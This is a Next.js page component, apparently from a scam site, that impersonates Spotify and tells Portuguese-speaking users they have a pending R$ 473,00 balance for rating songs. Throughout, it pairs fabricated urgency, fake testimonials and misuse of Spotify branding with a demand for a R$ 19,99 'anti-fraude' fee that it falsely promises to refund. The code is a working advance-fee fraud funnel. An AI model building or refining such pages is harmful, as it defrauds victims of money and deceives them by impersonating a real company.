import Image from "next/image";
import Logo from '@/assets/logo-green.png'
import LogoWhite from '@/assets/logowhite.png'
import { cookies } from "next/headers";
import { Doubts } from "./doubts";
import { ButtonCheckout } from "./button-checkout";
import { redirect } from "next/navigation";
import { db } from "@/lib/prisma";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";

import Bg from '@/assets/bg.jpeg'
import { TriangleAlert } from "lucide-react";


interface CheckoutPageProps {
  searchParams: {
    modal?: string | null
  }
}




export default async function CheckoutPage({ searchParams }: CheckoutPageProps) {

  const pixKey = cookies().get('user_pix_key')

  const token = cookies().get('token')?.value

  if (!token) {
    redirect('/spotify/register')
  }

  const user = await db.user.findUnique({
    where: {
      id: token
    }
  })

  if (!user) {
    redirect('/spotify/register')
  }



  return (
    <>

      {searchParams.modal === 'downsell' && (
        <Dialog defaultOpen>
          <DialogContent className="bg-[#181818] border-black ring-0 text-white max-sm:max-w-[350px] rounded-lg">
            <DialogHeader>
              <div className="flex items-center">
                <TriangleAlert className="text-[#01D661] size-5 mr-2" />
                <DialogTitle className="text-center text-[#01D661]">Está é sua última oportunidade!</DialogTitle>
              </div>

              <DialogDescription className="text-xs text-center text-[#a8a8a8]">
                Resgate agora o seu saldo de <span className="font-semibold">R$ 473,00</span> pendente.
              </DialogDescription>


            </DialogHeader>

            <p className="text-xs text-[#a8a8a8]">Depois que você fechar essa página, você não terá mais a oportunidade de sacar seu valor pendente pela sua avaliação.</p>

            <div className="flex items-center justify-center">
              <Image src={Bg} className="rounded-lg" width={250} height={125} alt="img" priority />
            </div>

            <div className="flex flex-col">
              <p>
                ⭐⭐⭐⭐⭐
              </p>
              <p className="text-xs text-[#a8a8a8]">
                Mais de 50.000 usuários já receberam por avaliar o app! Clique no botão abaixo e receba seu valor agora.
              </p>
            </div>


            <ButtonCheckout />

          </DialogContent>
        </Dialog>
      )}

      <div className="w-full relative min-h-screen bg-[#181818] text-white">

        <div className="sticky z-50 top-0 left-0 right-0 h-16 bg-black flex items-center justify-between p-5">
          <Image src={Logo} className='object-contain' width={100} height={30} alt='logo' priority />

          <div className="relative border border-[#01D661] rounded-lg flex items-center gap-1 py-1 px-4 text-black">
            <span className="absolute bg-black -top-2 left-2 px-1 text-[10px] font-semibold text-[#01D661]">SALDO</span>
            <span className="text-black text-lg font-semibold">
              <span className='text-xs text-white font-semibold'>{new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL'
              }).format(473)}</span>
            </span>
          </div>

        </div>

        <div className='w-full p-5'>
          <div className='w-full bg-black rounded-lg p-5 space-y-8'>
            <div className="flex items-center justify-center">
              <Image src={LogoWhite} className="object-contain" width={100} height={30} alt="src" priority />
            </div>

            <h2 className='text-xl font-bold text-center'>Parabéns, {user.name.toUpperCase().split(" ")[0]}!</h2>

            <div className='text-center bg-[#01d661]/40 border border-[#01D661] p-3 rounded-lg text-white/90'>
              Enviando <span className='text-sm font-bold text-white'>{new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL'
              }).format(473)}
              </span>
              {" "}para a chave PIX {pixKey?.value}!
            </div>

            <p className="text-[#a8a8a8] text-center text-sm">
              Usamos uma taxa <span className="text-white font-bold">anti-fraude</span> para evitar fraudes e abusos dos saques que estavam acontecendo dentro do nosso <span className="text-white font-bold">sistema.</span>
            </p>

            <p className="text-[#a8a8a8] text-center text-sm">Fique tranquilo, você receberá o valor
              da taxa de <span className="text-white font-bold">R$ 19,99 de volta junto ao valor resgatado,</span> é apenas uma etapa
              para verificar que você não é um robô.
            </p>

            <ButtonCheckout />

            <p className="text-center text-xs text-[#a8a8a8] pt-10">
              Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Spotify ®.</b>
            </p>
          </div>
        </div>
        <Doubts />
      </div>

    </>
  )
}